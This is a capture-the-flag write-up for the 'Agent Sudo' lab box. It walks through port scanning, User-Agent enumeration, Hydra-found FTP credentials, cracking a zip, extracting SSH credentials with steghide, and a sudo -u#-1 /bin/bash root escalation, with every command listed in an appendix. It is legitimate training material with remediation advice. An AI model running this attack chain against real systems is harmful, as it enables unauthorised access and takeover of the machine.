# Agent Sudo — CTF Writeup — Web Enumeration, Steganography, SSH Access, and Sudo Privilege Escalation

## 1. Engagement Overview
- **Title / Project Name:** Agent Sudo (CTF room)
- **Author:** Myself
- **Date:** Old
- **Objective:** Capture user and root flags by performing web enumeration, extracting hidden data from images, securing SSH access, and abusing sudo misconfiguration for privilege escalation.
- **Scope / Target:** `10.201.41.224`
- **Testing Window:** CTF box
- **Tools Used:** nmap, curl, hydra, ftp client, unzip, zip2john, john, steghide, ssh, scp, linPEAS, basic unix utilities
- **Methodology Reference:** Recon → Enumeration → Exploitation → Post-exploitation → Cleanup

## 2. Short Summary
Initial access was gained via web enumeration with custom User-Agent headers, revealing a hint for weak credentials. Used FTP to retrieve files, extracted a hidden zip and steganographic data to obtain SSH credentials for `james`. SSH login provided user-level access and a user flag. Privilege escalation was achieved via an unsafe sudo configuration allowing `(ALL, !root) /bin/bash`, which was abused using the `sudo -u#-1 /bin/bash` technique to spawn a root shell and read `/root/root.txt`. Overall severity: **High (full system compromise)**.

## 3. Methodology / Process Flow

### 3.1 Recon / Port scan
**Command**
```bash
nmap -sS 10.201.41.224
```

**Key output (summary)**
- `21/tcp` — ftp (open)
- `22/tcp` — ssh (open)
- `80/tcp` — http (open)
- Notes: Anonymous FTP disabled. Webserver required custom User-Agent headers.

### 3.2 Web enumeration
- Observed message on port 80 instructing agents to use their codename as User-Agent.
- Iterated single-letter User-Agent (http header) values with `curl` and discovered that `C` returned a message indicating Chris has a weak password (hinting at FTP/SSH credentials).

**Command**
```bash
curl -A "C" -L 10.201.41.224
```

### 3.3 FTP enumeration
- Logged in using credentials discovered via Hydra (chris:crystal).
- Directory listing showed `To_agentJ.txt`, `cute-alien.jpg`, and `cutie.png`.
- `To_agentJ.txt` hinted that the real picture and a password were hidden inside the fake picture.

**Commands / output excerpt**
```text
ftp> open 10.201.41.224
230 Login successful.
ftp> ls
-rw-r--r--    1 0        0             217 Oct 29  2019 To_agentJ.txt
-rw-r--r--    1 0        0           33143 Oct 29  2019 cute-alien.jpg
-rw-r--r--    1 0        0           34842 Oct 29  2019 cutie.png
```

### 3.4 Steganography / hidden data extraction
- Extracted a hidden zip from `cutie.png` and cracked it using `zip2john` + `john` with rockyou; password found: `alien`.
- `To_agentR.txt` contained Base64 string `QXJlYTUx` → decodes to `Area51` (used as a stego hint).
- Used `steghide` on `cute-alien.jpg` to extract `message.txt`, which contained credentials for `james` (password: `hackerrules`).

**Commands (examples)**
```bash
unzip cutie.png  # extracted hidden.zip
zip2john hidden.zip > zip.hash
john --wordlist=/usr/share/wordlists/rockyou.txt zip.hash  # found password: alien
# Read To_agentR.txt -> contained 'QXJlYTUx' (Base64 -> Area51)

steghide info cute-alien.jpg
steghide extract -sf cute-alien.jpg
cat message.txt  # contains: 'Hi james,... Your login password is hackerrules!'
```

### 3.5 SSH login and user flag
- SSH using `james:hackerrules` allowed login to the system.
- Located `user_flag.txt` and retrieved the user flag.
- Copied `Alien_autospy.jpg` locally for verification/reverse-image checks.

**Commands**
```bash
ssh james@10.201.41.224
ls
cat user_flag.txt
scp Alien_autospy.jpg /local/path
```

### 3.6 Privilege escalation (Post-Exploitation)
- Transferred `linPEAS` to the target for enumeration:
```bash
scp linPEAS/linpeas.sh james@10.201.41.224:/tmp/
```
- Checked sudo privileges with `sudo -l` and observed:
```
User james may run the following commands on agent-sudo:
    (ALL, !root) /bin/bash
```
- Abused the misconfiguration using the `sudo -u#-1 /bin/bash` trick to spawn a root shell.

**Commands / exploit**
```bash
sudo -u#-1 /bin/bash
whoami  # => root
cat /root/root.txt
```

## 4. Findings Summary
| ID | Vulnerability | Severity | Impact | Recommendation |
|----|---------------|---------:|--------|----------------|
| 1 | Unsafe sudo configuration: `(ALL, !root) /bin/bash` | Critical | Full root escalation via sudo abuse | Remove or restrict this sudoers entry; avoid allowing shell binaries for all users; use command-specific least-privilege entries |
| 2 | Sensitive data hidden in public assets (steganography, archives) | Medium | Credential disclosure leading to account compromise | Avoid storing secrets in public assets; scan public shares for hidden data and remove sensitive content |
| 3 | Weak credentials discovered via hints | Medium | Enables initial access through credential guessing | Enforce strong password policies and rotate compromised credentials; do not expose credential hints publicly |

## 5. Technical Details

### Finding 1 — Unsafe sudo configuration
- **Description:** Sudoers allowed execution of `/bin/bash` for `(ALL, !root)` which can be abused to gain root privileges using user specifier tricks.
- **Impact:** Local privilege escalation resulting in complete system compromise.
- **Evidence (commands / output):**
```text
sudo -l
User james may run the following commands on agent-sudo:
    (ALL, !root) /bin/bash
sudo -u#-1 /bin/bash
whoami  # root
```
- **Recommendation:** Remove or tighten sudoers entries. Do not allow execution of interactive shells; use tightly-scoped commands and CMND_Alias for allowed tasks.

### Finding 2 — Steganography & hidden zip revealed credentials
- **Description:** Images and archived content on the FTP server contained hidden files that disclosed passwords and instructions.
- **Impact:** Attackers can extract credentials and gain initial access.
- **Evidence (commands / output):**
```bash
unzip cutie.png  # extracted hidden.zip
john --wordlist=/usr/share/wordlists/rockyou.txt zip.hash  # password: alien
steghide extract -sf cute-alien.jpg
cat message.txt  # 'Your login password is hackerrules!'
```
- **Recommendation:** Remove sensitive data from public file shares and implement content scanning for hidden data. Train staff not to store secrets in public assets.

### Finding 3 — Weak credential hints on web server
- **Description:** Web content indicated a user with a weak password (Chris), which led to successful FTP/credential discovery.
- **Impact:** Facilitated credential discovery and access via FTP/SSH.
- **Evidence:** `curl -A "C" -L 10.201.41.224` returned hint text.
- **Recommendation:** Avoid publishing credential hints or sensitive developer notes; use secure channels for internal notes.

## 6. Remediation Plan
- **Critical:** Remove the `(ALL, !root) /bin/bash` sudo entry and audit sudoers for similarly unsafe entries.
- **High:** Remove secrets from public/shared files and implement automated scanning for steganographic content and archives.
- **Medium:** Enforce stronger password policies, rotate compromised credentials, and disable FTP anonymous/logins where unnecessary.
- **Medium:** Harden webserver headers and cookie flags; reduce information disclosure.
- **Low:** Conduct regular security awareness training for developers regarding storage of secrets.

## 7. Appendix: Commands Used
```bash
# Recon
nmap -sS 10.201.41.224

# Web enumeration
curl -A "C" -L 10.201.41.224

# FTP
ftp 10.201.41.224
# download To_agentJ.txt, cutie.png, cute-alien.jpg

# Extract zip from png
unzip cutie.png
zip2john hidden.zip > zip.hash
john --wordlist=/usr/share/wordlists/rockyou.txt zip.hash
cat To_agentR.txt

# Stego
steghide info cute-alien.jpg
steghide extract -sf cute-alien.jpg
cat message.txt

# SSH
ssh james@10.201.41.224
cat user_flag.txt
scp Alien_autospy.jpg /image.jpg

# Privilege escalation
scp linpeas.sh james@10.201.41.224:/tmp/
sudo -u#-1 /bin/bash
cat /root/root.txt
```

---

